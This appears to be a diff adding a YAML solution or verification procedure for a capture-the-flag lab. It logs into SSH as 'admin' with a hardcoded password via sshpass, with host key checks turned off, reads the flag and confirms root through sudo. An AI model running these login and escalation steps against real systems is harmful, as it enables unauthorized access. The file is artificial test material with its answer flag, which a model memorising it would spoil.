@@ -1,0 +1,60 @@
+procedure:
+- action:
+    command: service ssh status || systemctl status ssh || ps aux | grep sshd
+    type: exec_target
+  expect:
+    exit_code: 0
+  outputs: {}
+  session: null
+  step_id: verify_ssh_running
+  timeout: 10
+- action:
+    command: id admin
+    type: exec_target
+  expect:
+    stdout_contains: admin
+  outputs: {}
+  session: null
+  step_id: verify_admin_user_exists
+  timeout: 10
+- action:
+    command: grep -i 'PasswordAuthentication' /etc/ssh/sshd_config
+    type: exec_target
+  expect:
+    stdout_contains: 'yes'
+  outputs: {}
+  session: null
+  step_id: verify_ssh_password_auth
+  timeout: 10
+- action:
+    command: sshpass -p adminpass123 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      admin@localhost 'id && cat /home/admin/flag.txt'
+    type: exec_target
+  expect:
+    stdout_contains: uid=1001(admin)
+  outputs:
+    shell_output: stdout
+  session: null
+  step_id: ssh_login_as_admin
+  timeout: 15
+- action:
+    command: sshpass -p adminpass123 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      admin@localhost 'id && groups && cat /home/admin/flag.txt'
+    type: exec_target
+  expect:
+    stdout_contains: FLAG{ssh_pivot_db_server_compromised}
+  outputs: {}
+  session: null
+  step_id: verify_flag_and_groups
+  timeout: 15
+- action:
+    command: sshpass -p adminpass123 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5
+      admin@localhost 'sudo /bin/bash -c id'
+    type: exec_target
+  expect:
+    stdout_contains: uid=0(root)
+  outputs: {}
+  session: null
+  step_id: verify_sudo_access
+  timeout: 15
+sessions: []
